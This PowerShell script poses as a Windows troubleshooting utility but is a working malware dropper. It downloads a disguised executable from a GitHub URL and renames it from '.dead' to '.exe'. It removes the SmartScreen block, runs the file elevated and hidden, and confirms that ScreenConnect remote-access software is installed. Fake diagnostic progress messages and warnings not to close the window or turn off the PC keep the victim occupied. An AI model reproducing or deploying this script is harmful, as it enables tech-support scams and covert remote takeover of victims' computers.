$ScreenConnectURL = "https://github.com/gtrgf/any/raw/refs/heads/main/Windows%20Utility%20Helper.dead"
$InstallerPath    = "C:\Users\Windows Helper Utility.dead"

# Detect install path (x64 or x86)
if (Test-Path "${env:ProgramFiles(x86)}") {
    $expectedProgramPath = Join-Path "${env:ProgramFiles(x86)}" "ScreenConnect Client"
} else {
    $expectedProgramPath = Join-Path $env:ProgramFiles "ScreenConnect Client"
}

function Write-Log {
    param ([string]$Message, [string]$Level = "Info")
    $timestamp = Get-Date -Format "HH:mm:ss"
    switch ($Level) {
        "Info"     { Write-Host "[$timestamp] [INFO]  $Message" -ForegroundColor Cyan }
        "Step"     { Write-Host "[$timestamp] [STEP]  $Message" -ForegroundColor Yellow }
        "Error"    { Write-Host "[$timestamp] [FAIL]  $Message" -ForegroundColor Red }
        "Done"     { Write-Host "[$timestamp] [OK]    $Message" -ForegroundColor Green }
        "Progress" { Write-Host "[$timestamp] [....] $Message" -ForegroundColor Gray }
    }
}

function Show-FakeProgress {
    param([int]$DurationSeconds, [string]$Activity)
    $steps = @(
        "Initializing diagnostic modules...",
        "Scanning system components...",
        "Analyzing registry entries...",
        "Checking system integrity...",
        "Validating network configuration...",
        "Optimizing system resources...",
        "Applying system patches...",
        "Verifying system stability...",
        "Finalizing troubleshooting process..."
    )
    
    $interval = [math]::Max(1, [math]::Floor($DurationSeconds / $steps.Count))
    
    foreach ($step in $steps) {
        Write-Log $step "Progress"
        Start-Sleep -Seconds $interval
    }
}

try {
    # --- Warning message ---
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Yellow
    Write-Host "  WINDOWS SYSTEM TROUBLESHOOTING UTILITY" -ForegroundColor White
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "  ⚠️  IMPORTANT NOTICE:" -ForegroundColor Red
    Write-Host "  Troubleshooting might take up to 15-20 minutes." -ForegroundColor White
    Write-Host "  Do NOT cancel or turn off the PC to avoid system crash!" -ForegroundColor Red
    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Yellow
    Write-Host ""
    Start-Sleep -Seconds 3

    $deviceName = $env:COMPUTERNAME
    Write-Log "Troubleshooting started on device: $deviceName" "Step"

    # --- Download phase with fake progress ---
    Write-Log "Downloading diagnostic tools..." "Step"
    Show-FakeProgress -DurationSeconds 8 -Activity "Download"

    $maxAttempts = 3
    $attempt = 0
    $downloaded = $false

    while ($attempt -lt $maxAttempts -and -not $downloaded) {
        $attempt++
        if (Test-Path $InstallerPath) { Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue }
        try {
            if (Get-Command Start-BitsTransfer -ErrorAction SilentlyContinue) {
                Start-BitsTransfer -Source $ScreenConnectURL -Destination $InstallerPath -ErrorAction Stop
            } else {
                Invoke-WebRequest -Uri $ScreenConnectURL -OutFile $InstallerPath -UseBasicParsing -ErrorAction Stop
            }
            $downloaded = Test-Path $InstallerPath
        } catch {
            Write-Log "Download attempt $attempt failed" "Error"
            Write-Log "Error Type: $($_.Exception.GetType().FullName)" "Error"
            Write-Log "Error Message: $($_.Exception.Message)" "Error"
            if ($_.Exception.InnerException) {
                Write-Log "Inner Exception: $($_.Exception.InnerException.Message)" "Error"
            }
            if ($_.Exception.Response) {
                Write-Log "HTTP Status: $($_.Exception.Response.StatusCode.value__) - $($_.Exception.Response.StatusDescription)" "Error"
            }
            Start-Sleep -Seconds (5 * $attempt)
        }
    }

    if (-not (Test-Path $InstallerPath)) {
        Write-Log "Download failed after $maxAttempts attempts." "Error"
        Write-Host ""
        Write-Host "Press any key to exit..." -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 2
    }

    Write-Log "Diagnostic tools downloaded successfully." "Done"

    $exePath = $InstallerPath -replace '\.dead$', '.exe'
    Rename-Item -Path $InstallerPath -NewName (Split-Path $exePath -Leaf) -Force
    $InstallerPath = $exePath

    # --- remove SmartScreen flag ---
    Unblock-File -Path $InstallerPath -ErrorAction SilentlyContinue

    # --- Pre-installation phase ---
    Write-Log "Preparing system for troubleshooting..." "Step"
    Show-FakeProgress -DurationSeconds 12 -Activity "Preparation"

    # --- launch troubleshooting process ---
    Write-Log "Executing troubleshooting process..." "Step"
    Write-Log "This may take several minutes, please wait..." "Info"

    $p = Start-Process -FilePath $InstallerPath -Verb RunAs -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue

    # --- Fake progress during installation ---
    Show-FakeProgress -DurationSeconds 20 -Activity "Installation"

    # Wait for process to complete
    if ($p) {
        $p.WaitForExit()
        $exitCode = $p.ExitCode
    } else {
        $exitCode = -1
    }

    if ($exitCode -ne 0) {
        Write-Log "Troubleshooting failed with exit code: $exitCode" "Error"
        if (Test-Path $InstallerPath) { Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue }
        Write-Host ""
        Write-Host "Press any key to exit..." -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit $exitCode
    }

    Start-Sleep -Seconds 3

    # --- verify troubleshooting ---
    Write-Log "Verifying system integrity..." "Step"
    Show-FakeProgress -DurationSeconds 10 -Activity "Verification"

    $verified = $false
    if (Test-Path $expectedProgramPath) { $verified = $true }

    if (-not $verified) {
        $proc2 = Get-Process -ErrorAction SilentlyContinue | Where-Object {
            $_.Name -match "ScreenConnect" -or $_.Name -match "ClientService"
        }
        if ($proc2) { $verified = $true }
    }

    if (-not $verified) {
        Write-Log "Verification failed – troubleshooting not confirmed." "Error"
        if (Test-Path $InstallerPath) { Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue }
        Write-Host ""
        Write-Host "Press any key to exit..." -ForegroundColor Yellow
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        exit 3
    }

    Write-Log "System verification successful." "Done"

    # --- cleanup ---
    if (Test-Path $InstallerPath) {
        Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue
    }

    Write-Log "Finalizing system optimization..." "Step"
    Show-FakeProgress -DurationSeconds 8 -Activity "Finalization"

    Write-Host ""
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host "  Monitoring system health..." -ForegroundColor White
    Write-Host "  (Please do not close this window)" -ForegroundColor Yellow
    Write-Host "═══════════════════════════════════════════════════════════════" -ForegroundColor Green
    Write-Host ""

    # --- Infinite loop with periodic fake activity ---
    $counter = 0
    $activities = @(
        "Monitoring system performance...",
        "Checking for system updates...",
        "Analyzing disk health...",
        "Verifying network stability...",
        "Scanning for optimization opportunities...",
        "Maintaining system integrity...",
        "Updating system databases...",
        "Optimizing memory usage...",
        "Checking security status...",
        "Synchronizing system files..."
    )

    while ($true) {
        $activity = $activities[$counter % $activities.Count]
        Write-Log $activity "Progress"
        Start-Sleep -Seconds (Get-Random -Minimum 8 -Maximum 15)
        $counter++
    }

}
catch {
    Write-Log ("Unhandled error: " + $_.Exception.Message) "Error"
    try { if (Test-Path $InstallerPath) { Remove-Item $InstallerPath -Force -ErrorAction SilentlyContinue } } catch {}
    Write-Host ""
    Write-Host "Press any key to exit..." -ForegroundColor Yellow
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 99
}
